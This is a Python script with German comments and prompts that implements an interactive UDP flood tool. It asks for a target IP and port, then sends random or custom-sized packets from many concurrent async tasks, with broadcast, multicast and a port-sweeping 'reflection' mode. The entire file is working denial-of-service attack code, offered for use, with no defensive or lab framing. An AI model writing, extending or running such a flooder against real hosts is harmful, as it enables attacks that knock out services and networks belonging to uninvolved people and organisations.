import asyncio
import socket
import os
import struct
import sys
from datetime import datetime

class UDPFlooder:
    def __init__(self, ip, port, packet_size=1024, delay=0, mode='normal', payload_mode='random', custom_payload=None, use_ipv6=False):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.delay = delay
        self.mode = mode
        self.payload_mode = payload_mode
        self.custom_payload = custom_payload
        self.use_ipv6 = use_ipv6
        self.packet_counter = 0
        self.stop_event = asyncio.Event()

    def log(self, message):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def generate_payload(self):
        if self.payload_mode == 'random':
            return os.urandom(self.packet_size)
        else:
            if self.custom_payload:
                base = self.custom_payload.encode('utf-8')
                return (base * (self.packet_size // len(base) + 1))[:self.packet_size]
            else:
                return os.urandom(self.packet_size)

    async def send_packets(self):
        payload = self.generate_payload()
        if self.use_ipv6:
            family = socket.AF_INET6
        else:
            family = socket.AF_INET

        # Erstelle UDP-Socket
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setblocking(False)

        # Modus-spezifische Einstellungen
        if self.mode == 'broadcast':
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            target = ('<broadcast>', self.port)
        elif self.mode == 'multicast':
            ttl = struct.pack('b', 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            target = (self.ip, self.port)
        else:
            target = (self.ip, self.port)

        loop = asyncio.get_running_loop()

        try:
            while not self.stop_event.is_set():
                if self.mode == 'reflection':
                    # Reflection: sende an Ports 1-1023
                    for p in range(1, 1024):
                        if self.stop_event.is_set():
                            break
                        addr = (self.ip, p)
                        if self.use_ipv6:
                            addr = (self.ip, p, 0, 0)
                        await loop.sock_sendto(sock, payload, addr)
                        self.packet_counter += 1
                        self.log(f"Reflection: Gesendet {self.packet_counter} UDP-Pakete an {addr[0]}:{addr[1]}")
                        if self.delay > 0:
                            await asyncio.sleep(self.delay)
                else:
                    await loop.sock_sendto(sock, payload, target)
                    self.packet_counter += 1
                    self.log(f"Gesendet {self.packet_counter} UDP-Pakete an {target[0]}:{target[1]}")
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
        except Exception as e:
            self.log(f"[ERROR] UDP Fehler: {e}")
        finally:
            sock.close()

    async def start(self, concurrency=10):
        self.log(f"Starte UDP Flooder: {self.ip}:{self.port} Mode: {self.mode} Payload: {self.payload_mode} Threads: {concurrency}")
        tasks = [asyncio.create_task(self.send_packets()) for _ in range(concurrency)]
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            self.log("Flooder wurde gestoppt.")
        finally:
            self.stop_event.set()

    def stop(self):
        self.stop_event.set()

async def main():
    # Beispiel-Konfiguration, hier kannst du Eingaben einbauen
    ip = input("Ziel-IP: ").strip()
    port = int(input("Ziel-Port: ").strip())
    packet_size = int(input("Packet-Größe (Bytes): ").strip())
    delay = float(input("Verzögerung zwischen Paketen (Sekunden, 0 für keine): ").strip())
    mode = input("Modus (normal, broadcast, multicast, reflection): ").strip().lower()
    payload_mode = input("Payload-Modus (random, custom): ").strip().lower()
    custom_payload = None
    if payload_mode == 'custom':
        custom_payload = input("Custom Payload (Text): ")
    use_ipv6 = input("IPv6 verwenden? (j/n): ").strip().lower() == 'j'
    concurrency = int(input("Anzahl paralleler Tasks (Threads): ").strip())

    flooder = UDPFlooder(ip, port, packet_size, delay, mode, payload_mode, custom_payload, use_ipv6)

    try:
        await flooder.start(concurrency)
    except KeyboardInterrupt:
        flooder.log("Abbruch durch Benutzer...")
        flooder.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nProgramm beendet.")
